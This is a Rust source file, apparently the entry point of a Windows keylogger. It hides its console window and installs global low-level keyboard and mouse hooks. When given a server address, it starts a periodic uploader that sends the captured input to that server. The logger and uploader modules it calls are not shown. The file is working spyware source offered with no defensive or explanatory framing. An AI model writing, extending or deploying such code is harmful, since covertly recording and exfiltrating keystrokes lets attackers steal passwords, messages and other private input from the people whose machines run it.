#![windows_subsystem = "windows"]

mod logger;
mod uploader;

use std::sync::{Arc, Mutex};
use std::env;
use windows::Win32::Foundation::HINSTANCE;
use windows::Win32::UI::WindowsAndMessaging::{
    SetWindowsHookExW, UnhookWindowsHookEx, GetMessageW, MSG,
    WH_KEYBOARD_LL, WH_MOUSE_LL,
};

fn main() {
    let args: Vec<String> = env::args().collect();
    
    if args.len() > 1 {
        let server_address = args[1].clone();
        let send_interval = if args.len() > 2 {
            args[2].parse().unwrap_or(300)
        } else {
            300
        };

        let running = Arc::new(Mutex::new(true));
        let config = uploader::UploaderConfig::new(server_address, send_interval);
        uploader::start_periodic_uploader(config, running.clone());
    }

    unsafe {
        let keyboard_hook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(logger::keyboard_hook),
            HINSTANCE::default(),
            0,
        );

        let mouse_hook = SetWindowsHookExW(
            WH_MOUSE_LL,
            Some(logger::mouse_hook),
            HINSTANCE::default(),
            0,
        );

        match (keyboard_hook, mouse_hook) {
            (Ok(kb_handle), Ok(mouse_handle)) => {
                let mut msg = MSG::default();
                while GetMessageW(&mut msg, None, 0, 0).as_bool() {
                }

                let _ = UnhookWindowsHookEx(kb_handle);
                let _ = UnhookWindowsHookEx(mouse_handle);
            }
            _ => {}
        }
    }
}
